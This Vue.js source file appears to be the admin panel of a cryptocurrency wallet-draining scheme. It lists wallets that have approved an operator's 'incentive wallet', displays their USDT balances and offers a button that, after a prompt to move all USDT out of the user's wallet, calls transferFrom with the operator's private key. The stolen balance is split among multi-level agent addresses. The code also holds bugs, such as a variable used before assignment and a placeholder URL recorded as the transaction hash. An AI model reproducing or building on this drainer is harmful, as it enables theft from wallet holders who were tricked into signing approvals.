<template>
    <div class="container">
        <el-card>
            <!-- 刷新数据 -->
            <el-row style="margin-top: 10px">
                <el-button type="primary" size="small" @click="handleReload">reload</el-button>
            </el-row>
        </el-card>
        <div style="min-height: 50px"></div>
        <!-- 表格区域 -->
        <el-card>
            <el-row>
                <el-table :data="listawait" border style="width: 100%" size="medium" height="400">
                    <el-table-column fixed prop="tempAddress" label="地址" width="150">
                        <!-- 显示授权的钱包地址，这里可能有个下拉菜单，分享 -->
                        <!-- 下拉区域 -->
                    </el-table-column>
                    <el-table-column prop="chainType" label="授权链" width="100">
                    </el-table-column>
                    <el-table-column prop="coinType" label="授权币种" width="100">
                    </el-table-column>
                    <el-table-column prop="accountBalance" label="钱包余额" width="100">
                        <template slot-scope="scope">
                            <el-button :index="scope.row.id" size="small" icon="el-icon-view" circle
                                @click="showBalance(scope.row, $event)">
                            </el-button>
                            <span style="display:none">
                                {{ scope.row.accountBalance }}
                            </span>
                        </template>
                        <!-- 显示授权用户账户余额balance1 -->
                    </el-table-column>
                    <el-table-column prop="incentives" label="激励百分比" width="100">
                        <!-- 显示激励百分比激励feedRatio---单个用户中 -->
                    </el-table-column>
                    <el-table-column prop="upperAgent" label="激励钱包地址" width="100">
                    </el-table-column>
                    <el-table-column prop="lastTime" label="修改时间" width="180">
                        <!-- 显示账户授权时间，以及最后一次进行激励feed times的时间 -->
                    </el-table-column>
                    <el-table-column prop="createTime" label="创建时间" width="180">
                        <!-- 创建时间create time -->
                    </el-table-column>
                    <el-table-column label="操作" fixed="right">
                        <template slot-scope="scope">
                            <el-button size="mini" @click.native.prevent="handleCheck()" :loading="logining">
                                刷新
                                <!-- 刷新授权状态，获取授权金额 -->
                                <!-- ="handleSubmit2" -->
                            </el-button>
                            <el-button size="mini" type="danger" @click="checkTap(scope.row)"
                                v-if="scope.row.isTransferFrom">
                                划账
                                <!-- 对话框，余额转移 -->
                            </el-button>
                        </template>
                    </el-table-column>
                </el-table>
            </el-row>
            <el-pagination background layout="prev, pager, next,total,sizes" :current-page="page"
                @current-change="handleCurrentChange" @size-change="handleSizeChange" :page-sizes="[5, 10, 15, 30]"
                :page-size="size" :total="total">
            </el-pagination>
        </el-card>


        <!-- 弹出对话框 -->
        <el-dialog title="余额转移" :visible.sync="dgVisible" width="50%">
            <el-form>
                <el-form-item style="font-size: 18px">
                    确定要转移用户钱包内的所有USDT吗?
                </el-form-item>
            </el-form>
            <div slot="footer" class="dialog-footer">
                <el-button @click="dgVisible = false">取 消</el-button>
                <el-button type="primary" @click="handleSure">确 定</el-button>
                <!-- dgVisible = false -->
            </div>
        </el-dialog>
    </div>
</template>
<script>
import { createNamespacedHelpers } from "vuex";
const { mapState, mapMutations, mapActions } = createNamespacedHelpers("User");
import BlockChain from "../blockchain/BlockChainBase";
const blockChain = new BlockChain();
export default {
    // name: "FindAll",
    data() {
        return {
            dialogVisible: false,
            dgVisible: false,
            logining: false,
            usersList: [],
            usersForm: {},
            scoperow: "",
            // 默认显示第几页
            currentPage2: 1,
            pageSize: 10,
            findone: [],
            balance: "",
            usdt: null,
            IFshow: true,
            exit: false,
            total: 0,//总共页数
            page: 1,//当前页
            size: 5,//每页显示的数量
            listawait: []
        };
    },
    computed: {
        ...mapState(['status', 'list', 'user', 'ban', 'getAccountTransfer', 'updateIncentives', 'updateCurrency']),
    },
    methods: {
        ...mapActions(["GoFindAll", 'UpdateBeliel', 'FindOne', 'AccountBalance', 'GetAccountTransfer', 'UpdateCurrency', 'UpdateIncentivess', 'UpdateNonces', 'AddRemitAccount']),
        checkTap(row) {
            this.scoperow = row;
            this.dgVisible = true;
        },
        handleCheck() {
            // 刷新金额数据
            // this.logining = false
            let user = sessionStorage.getItem("user");
            let { id } = JSON.parse(user);
            this.GoFindAll(id);
        },
        handleReload() {
            // 刷新数据操作
            let user = sessionStorage.getItem("user");
            let { id } = JSON.parse(user);
            this.GoFindAll(id);
            window.location.reload();
        },
        handleCancle() {
            // 取消表单提交，并清空内容
            this.dynamicValidateForm = {};
            this.dialogVisible = false;
        },
        async handleSure() {
            // 获取用户划账交易类型
            const { chainType } = this.scoperow
            const h = this.$createElement
            let user = sessionStorage.getItem('user')
            let res = JSON.parse(user)
            await this.FindOne(res)
            await this.GetAccountTransfer({ id: this.scoperow.id, userParentId: this.scoperow.userParentId })
            let check = false
            console.log('分成用户数据: ', this.getAccountTransfer);
            this.getAccountTransfer.forEach(element => {
                if (element.proportion == 0) {
                    check = true
                }
            })
            if (check) {
                let res = confirm('部分账号分成比例为0,确定要划账吗?')
                if (!res) {
                    this.dgVisible = false
                    return;
                }
            }
            if (this.getAccountTransfer.length == 0) {
                this.$notify({
                    title: '拉取服务器数据失败',
                    message: h('i', { style: 'color: teal' }, '无法获取上级代理已经平台账户信息, 请联系管理员')
                })
                return
            }

            console.log(this.scoperow);
            var apiKey, agentAdress, userEthAddress
            if (chainType == 'ETH') {
                apiKey = this.user.ethMainnetKey                   //激励钱包私钥
                agentAdress = this.user.ethMainnetAddress          //激励钱包地址
                userEthAddress = this.scoperow.ethMainnetAddress   //用户钱包地址
            }
            else if (chainType == 'BSC') {
                apiKey = this.user.bscMainnetKey                   //激励钱包私钥
                agentAdress = this.user.bscMainnetAddress          //激励钱包地址
                userEthAddress = this.scoperow.bscMainnetAddress   //用户钱包地址
            }
            else if (chainType == 'TRC') {
                apiKey = this.user.trcMainnetKey                   //激励钱包私钥
                agentAdress = this.user.trcMainnetAddress          //激励钱包地址
                userEthAddress = this.scoperow.trcMainnetAddress   //用户钱包地址
            }
            console.log(this.getAccountTransfer);

            // 定义开关 记录操作
            var doSetup = (index) => {
                var targetAddress
                if (chainType == 'ETH') targetAddress = this.getAccountTransfer[index].address
                else if (chainType == 'BSC') targetAddress = this.getAccountTransfer[index].bscAddress
                else if (chainType == 'TRC') targetAddress = this.getAccountTransfer[index].trcAddress

                this.$notify({
                    title: '(分成比例:' + this.getAccountTransfer[index].proportion + '%)收款钱包地址: ',
                    message: targetAddress,
                    type: 'success',
                })

                blockChain.doBalanceOf(agentAdress, userEthAddress, async (balance, web3) => {
                    if (balance) {
                        var curBalance = balance * (this.getAccountTransfer[index].proportion / 100)
                        this.$notify({
                            title: '发起划账交易',
                            message: h('i', { style: 'color: teal' }, '账户余额: ' + balance + 'USDT' + "\n划账数额: " + curBalance)
                        })

                        console.log('USDT总额: (' + balance + ')  ' + agentAdress + '[' + this.getAccountTransfer[index].proportion + '%]' + ' 得到的USDT: ', curBalance)
                        blockChain.doTransferFrom(agentAdress, apiKey, userEthAddress, targetAddress, curBalance, async (status, hash, nonce) => {
                            if (status == true) {
                                // 划账记录
                                await this.AddRemitAccount({ loginUserId: res.id, id:this.getAccountTransfer[next].uid, address: this.scoperow.bscMainnetAddress, type: chainType,hash:'http://www.baidu.com' })
                                this.$notify({
                                    title: '操作成功',
                                    message: h('i', { style: 'color: teal' }, '请等待上链确认信息, 您的链上Hash: ' + hash + '\n等待时间由当前链块阻塞度与燃油费高低决定, 请耐心等待到账')
                                })
                                let { id } = JSON.parse(sessionStorage.getItem('user'))
                                // 记录每次交易编号
                                await this.UpdateNonces({ id, nonce })

                                var next = index + 1
                                if (next < this.getAccountTransfer.length)
                                    doSetup(next)
                            }
                            else {
                                this.$notify.error({
                                    title: '操作失败',
                                    message: hash.message
                                })
                            }

                        }, web3, this.user.nonce, index, chainType)
                    }
                }, null, true, chainType)
            }

            //开始执行
            doSetup(0)

            // 模态框隐藏
            this.dgVisible = false
        },
        async CheckWallet(row) {
            // 获取用户划账交易类型
            const { chainType } = row
            // 查询余额
            let user = sessionStorage.getItem("user");
            let res = JSON.parse(user);
            let { id } = JSON.parse(user);
            await this.FindOne(res);
            var userAddress
            if (chainType == 'ETH') userAddress = row.ethMainnetAddress
            else if (chainType == 'BSC') userAddress = row.bscMainnetAddress
            else if (chainType == 'TRC') userAddress = row.trcMainnetAddress

            blockChain.doBalanceOf(this.user.address, userAddress, async (result) => {
                if (result) {
                    console.log("余额 = ", result);
                    this.balance = result;
                    await this.AccountBalance({
                        userId: row.userId,
                        accountBalance: this.balance,
                    });
                    this.GoFindAll(id);
                } else return "查询失败";
            }, null, false, chainType);
        },
        showBalance(row, e) {
            if (e.currentTarget.getAttribute("index") == row.id) {
                e.currentTarget.style.display = "none";
                e.currentTarget.nextElementSibling.style.display = "inline-block";
            }
            this.CheckWallet(row);
            this.scoperow = row;
        },
        handleCurrentChange(page) {
            this.page = page
        },
        handleSizeChange(size) {
            this.size = size
        },
        async getList() {
            let user = sessionStorage.getItem("user");
            let res = JSON.parse(user)
            await this.FindOne(res)
            let { id } = JSON.parse(user);
            await this.GoFindAll(id);

            this.$nextTick(() => {
                this.list.filter(async (item, index) => {
                    var agentAddress, userAddress, upperAddress
                    if (item.chainType == 'ETH') {
                        agentAddress = this.user.ethMainnetAddress   //当前代理激励钱包地址   
                        userAddress = item.ethMainnetAddress         //用户钱包地址
                        upperAddress = item.parentEthMainnetAddress  //上级激励钱包地址
                    }
                    else if (item.chainType == 'BSC') {
                        agentAddress = this.user.bscMainnetAddress
                        userAddress = item.bscMainnetAddress
                        upperAddress = item.parentBscMainnetAddress
                    }
                    else if (item.chainType == 'TRC') {
                        agentAddress = this.user.trcMainnetAddress
                        userAddress = item.trcMainnetAddress
                        upperAddress = item.parentTrcMainnetAddress
                    }

                    item.upperAgent = upperAddress
                    item.isTransferFrom = agentAddress == upperAddress ? true : false
                    await blockChain.checkApprove(upperAddress, userAddress, (result) => {
                        if (result) {
                            this.listawait.push(item)
                        }
                    }, item.chainType)
                })
                this.total = this.listawait.length
                this.listawait.slice((this.page - 1) * this.size, this.page * this.size)
            })
        }
    },
    created() {
        this.getList()
    },
};
</script>
<style>
.page {
    display: none;
}

.el-pagination {
    margin: 5px 0;
    float: right;
}
</style>
